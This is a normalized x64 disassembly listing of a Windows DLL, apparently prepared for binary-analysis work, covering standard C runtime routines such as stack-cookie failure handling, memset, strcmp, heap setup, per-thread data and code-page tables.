mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
movaps xmm6 [ rsp + 0x60 ]
mov rsp r11
pop rdi
retn
test [ rax ] 0x240
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov [ rdi ] rcx
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
test [ rax ] 0x81
je r-xdata
xorpd xmm6 xmm6
test rdi rdi
je r-xdata
test [ rax ] 0x100
je r-xdata
cmp [ rbx ] 0x2d
movsd xmm6 [ rw-data ]
jne r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov [ rdi ] rsi
jmp r-xdata
movsd xmm6 [ rax + 0x10 ]
movsd xmm0 [ rax + 0x10 ]
xorpd xmm6 xmm6
ucomisd xmm0 xmm6
jpe r-xdata
call sub_1800194ec
mov [ rax ] 0x22
jmp r-xdata
xorpd xmm6 [ r--data ]
jmp r-xdata
movapd xmm0 xmm6
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jne r-xdata
sub_18001d444
sub rsp 0x28
call sub_180024df4
test rax rax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_180024e04
mov ecx 0x3
call sub_18001fee0
int3
mov r8d 0x1
mov edx 0x40000015
lea ecx [ r8 + 0x2 ]
call sub_18001d8c4
sub_18001d4a0
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_180025038
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_180025038
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_18001d5ec
push rbx
sub rsp 0x20
test rcx rcx
je r-xdata
call sub_1800194ec
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
sub r9 r8
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ r9 + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
sub_18001d650
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_180022e38
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_180022d38
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_180018b3c
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_180018b3c
jmp r-xdata
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
sub_18001d6d0
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_18001d788
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18001d7d0
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_18001d8c4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
lea rbp [ rsp - 0x4f0 ]
sub rsp 0x5f0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4e0 ] rax
mov edi r8d
mov esi edx
mov ebx ecx
cmp ecx 0xffffffff
je r-xdata
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_18001d7d0
lea r11 [ rsp + 0x70 ]
lea rax [ rbp + 0x10 ]
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov r12 [ rbp + 0x108 ]
lea rdx [ rsp + 0x40 ]
mov rcx r12
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
call sub_180025038
mov rax [ rbp + 0x508 ]
mov [ rbp + 0x108 ] rax
lea rax [ rbp + 0x508 ]
mov [ rbp + 0xa8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rbp + 0x10 ]
mov r8 r12
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
mov rcx [ rbp + 0x4e0 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x5f0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
test edi edi
jne r-xdata
mov rax [ rbp + 0x508 ]
mov [ rsp + 0x70 ] esi
mov [ rsp + 0x74 ] edi
mov [ rbp - 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx ebx
call sub_180025038
sub_18001da44
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call [ DecodePointer@IAT ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
test rax rax
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_18001da10
int3
mov r10 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] r10
call rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_18001dad4
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
mov [ rsp + 0x30 ] 0x2
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
mov eax 0x1
mov rcx [ rw-data ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
call [ HeapSetInformation@IAT ]
sub_18001db4c
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_180025cc4
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_1800194ec
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_1800194ec
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_180025ab0
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_18002591c
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_180025a50
test eax eax
jne r-xdata
call sub_180025ab0
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_18002591c
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_1800259fc
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_1800250d8
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_18001dcdc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x50
xor ebx ebx
mov r12 r8
mov r13 rcx
mov rsi rdx
lea rcx [ rbp - 0x28 ]
lea r8d [ rbx + 0x28 ]
xor edx edx
mov rdi r9
mov [ rbp - 0x30 ] rbx
call sub_18001d7d0
test rdi rdi
jne r-xdata
test r12 r12
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
or eax 0xffffffff
jmp r-xdata
mov r9 [ rbp + 0x48 ]
mov r8 [ rbp + 0x40 ]
mov ecx 0x7fffffff
cmp r12 rcx
mov eax r12d
mov rdx rdi
cmova eax ecx
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x28 ] eax
call r13
mov edi eax
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
test eax eax
js r-xdata
cmp [ rbp - 0x28 ] ebx
mov [ rsi + r12 - 0x1 ] bl
setge bl
lea eax [ rbx - 0x2 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_18001db4c
cmp eax 0xffffffff
je r-xdata
mov rax [ rbp - 0x30 ]
mov [ rax ] bl
jmp r-xdata
mov eax edi
jmp r-xdata
sub_18001ddc4
push rbx
sub rsp 0x30
mov rbx rcx
test r8 r8
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
test rcx rcx
je r-xdata
test rdx rdx
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_180026010 ]
call sub_18001dcdc
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ rbx ] 0x0
add rsp 0x30
pop rbx
retn
call sub_1800194ec
mov [ rax ] 0x22
jmp r-xdata
call sub_18001dab4
or eax 0xffffffff
sub_18001de34
[ rcx ]
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ]
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ]
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ]
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ]
retn
[ rdx ]
sub_18001dec0
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_18001df64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_180018b3c
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_180018b3c
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_180018b3c
mov rcx [ rbx + 0x130 ]
call sub_180018b3c
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_180021f0c
mov rcx [ rbx + 0x158 ]
call sub_180018b3c
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
dec rsi
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180018b3c
cmp [ rcx ] 0x0
jne r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x110 ]
call sub_180018b3c
mov rcx [ rbx + 0x128 ]
call sub_180018b3c
cmp [ rcx ] 0x0
jne r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x128 ]
call sub_18002266c
call sub_180018b3c
call sub_180018b3c
mov rcx [ rbx + 0x128 ]
call sub_180022398
sub_18001e0e0
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_18001de34
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_18001dec0
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_18001df64
sub_18001e138
push rbx
sub rsp 0x20
call sub_18001e320
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_180022e38
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_18001e0e0
mov rbx rax
mov ecx 0xc
call sub_180022d38
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_18001fefc
call sub_18001e320
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_18001e1e4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_180022e38
nop
mov rax [ rbx + 0xb8 ]
[ rax ]
mov ecx 0xd
call sub_180022d38
mov ecx 0xc
call sub_180022e38
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_18001de34
nop
mov ecx 0xc
call sub_180022d38
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_18001e29c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_18001b79c
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_180018b3c
xor ebx ebx
xor edx edx
call sub_18001e1e4
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_18001e344
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_180018b3c
mov edi 0xd
mov ecx edi
call sub_180022e38
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_180018b3c
mov ecx edi
call sub_180022d38
mov ecx 0xc
call sub_180022e38
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ]
jne r-xdata
mov ecx 0xc
call sub_180022d38
mov rcx rbx
call sub_180018b3c
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_18001dec0
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_180018b3c
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_18001df64
nop
sub_18001e478
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_18001e344
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_18001e4b8
push rbx
sub rsp 0x20
call sub_18001fbec
call sub_180022c2c
test eax eax
je r-xdata
call sub_18001e1bc
xor eax eax
lea rcx [ sub_18001e344 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_18001b79c
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_18001e1e4
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18001e53c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8d esi
xor edx edx
call sub_18001d7d0
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0xc ] r11d
mov [ rbp + 0x4 ] r11
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
dec rsi
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
dec rdx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18001e5c8
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x488 ]
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x470 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rcx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rbp + 0x470 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x270 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180020bc0
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x70 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18001bbb0
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18001bbb0
lea rdx [ rbp + 0x70 ]
lea r8 [ rbp + 0x170 ]
sub rdx rsi
lea r11 [ rbp + 0x270 ]
lea rcx [ rsi + 0x1d ]
sub r8 rsi
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov eax r8d
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_18001d7d0
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rdx + rcx - 0x1d ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ r8 + rcx - 0x1d ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
add r11 0x2
dec rbx
jne r-xdata
sub_18001e7b8
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_18001e320
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_180022e38
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_180022d38
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
